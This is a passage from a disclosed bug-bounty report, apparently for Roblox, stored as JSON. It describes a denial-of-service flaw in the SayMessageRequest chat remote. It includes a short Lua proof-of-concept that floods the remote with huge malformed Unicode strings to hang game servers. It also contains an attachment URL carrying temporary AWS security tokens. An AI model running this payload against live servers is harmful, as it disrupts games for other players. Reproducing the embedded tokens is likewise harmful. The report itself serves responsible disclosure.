This works in any game that has the \"SayMessageRequest\" remote and can be done easily, especially if the attacker has some sort of \"script execution\" exploit on their hands.\n\nTo reproduce this exploit:\nGo into Roblox Client/Studio\nExecute this into the cmdbar\n```\nlocal malformed = string.rep(\"ก็็็▌▓\", math.random(10000, 2e5))\nlocal remote = game:GetService'ReplicatedStorage'.DefaultChatSystemChatEvents:WaitForChild'SayMessageRequest'\nwhile wait() do\n\tremote:FireServer(malformed, malformed)\nend\n```\nWatch the server hang itself (try walking around).\n\nNote: If done on Studio while playing solo, it seems to hang the entire program. Luckily I found a workaround to this by testing it in a local server with 2-3 players and then executing it on any of the player instances.\n\nI've attached a PoC video.\n\n## Impact\n\nHang/Freeze any game servers which isn't intended.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":562467,"file_name":"freeze.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dg6skpR4NGyTPuXPiyYoT8oT?response-content-disposition=attachment%3B%20filename%3D%22freeze.mp4%22%3B%20filename%2A%3DUTF-8%27%27freeze.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151708Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=66008b8ba93e4860af397a9a2a54c3d919ff2f0636640e612166f33d0f742528","file_size":16084302,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-04-29T22:13:49.008Z","allow_singular_disclosure_after":-45766999.71282763,"singular_disclosure_allowed":true,"vote_count":32,"voters":["ali","sailay1996","gonzalezjo","sa1tama0","scripter-s","aretee","sjbrien711","apkend","whatifi","goofykidk","and 22 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":12247,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"Roblox Client","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5653334,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-08-23T21:29:58.019Z","updated_at":"2019-08-23T21:29:58.019Z","actor":{"username":"b0mblebee","cleared":false,"url":"/b0mblebee","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/M7XZMLZaLX3D7XoNwPywWdV1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6280836,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @albertl,\nJust want to say that your bug report was well received.
